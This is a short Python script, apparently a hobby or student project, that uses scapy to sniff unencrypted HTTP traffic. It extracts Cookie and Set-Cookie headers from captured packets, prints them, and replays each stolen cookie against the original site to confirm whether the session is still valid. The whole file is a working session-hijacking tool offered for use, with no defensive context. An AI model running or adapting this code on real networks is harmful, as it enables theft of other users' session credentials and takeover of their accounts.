import scapy
import scapy.all as S
from scapy.layers.http import *
import requests


class ScapyProject:
    def __init__(self):
        S.load_layer("http")
        # print(HTTPRequest)
        print("Liteneing for HTTP packets...")


    def filter_get_requests(self, pkg):
        """
            This function is a filter function that is used by scapy sniffer.
            This filter filters only HTTPRequest packets and that to which are 
            of method GET requests.
        """

        return pkg.haslayer(HTTPResponse) or pkg.haslayer(HTTPRequest)


    def prnfunc(self, x):
        """
            This function is being executed every single time when the packet is captured.
            Performs valious taks of :-
                1) Checks if packet contains cookie or not.
                2) Extracts all the crucial data from the packet and prints the packet headers also.
                3) Verifies if the cookie is right by requesting the same packet by itself.

        """
        try:
            cookie = x[HTTPResponse].Set_Cookie.decode()
            print("packet is of response type")
            print("")
            if cookie: 
                print("This Packet Contains Set-Cookie header having value {}".format(cookie))
                print("=================================================== Packet is ===================================================")
                print(x)
            

        except Exception as e:
            print("error is ", e)
        
        try:
            cookie = x[HTTPRequest].Cookie.decode()
            print("packet is of request type")
            print("")
            if cookie: 
                print("This Packet Contains Cookie having value {}".format(cookie))
            print("=================================================== Packet is ===================================================")                
            print(x)

            
            # Extracting Data From the Captured Packet
            path   = x[HTTPRequest].Path.decode()
            host   = x[HTTPRequest].Host.decode()
            method = x[HTTPRequest].Method.decode()
            url = "http://" + str(host) + str(path)


            # Verifying if Cookie is valid for site or not
            print("Verifying if Cookie is Valid or Not")
            self.verify_cookie(url, cookie, "GET")
            print("")
            print("*************************************************************************************************************************************************************")
        # x.summary() 
        except:
            pass


    def startSniffing(self):
        """
            This function starts the sniffing proccess of HTTP packets that goes from system. 
        """

        self.sniffed_packets = S.sniff(lfilter=self.filter_get_requests, prn=self.prnfunc)


    def verify_cookie(self, url, cookie, method):
        """
            This Function verifies if the cookie is valid for the website or not by
            making an HTTP request for the particular site by making a request and getting response as 200 OK.
        """

        payload={}
        headers = {
          'Cookie': cookie
        }

        response = requests.request(method.upper(), url, headers=headers, data=payload)
        # print(response.text)
        if int(response.status_code)==200:
            print("**********************  This Cookie is Valid  **********************".upper())
        else:
            print("xxxxxxxxxxxxxxxxxxxxxxxxxxxxx  Cookie is not Valid  xxxxxxxxxxxxxxxxxxxxxxxxxxxxx".upper())




scapyproject = ScapyProject()
scapyproject.startSniffing()
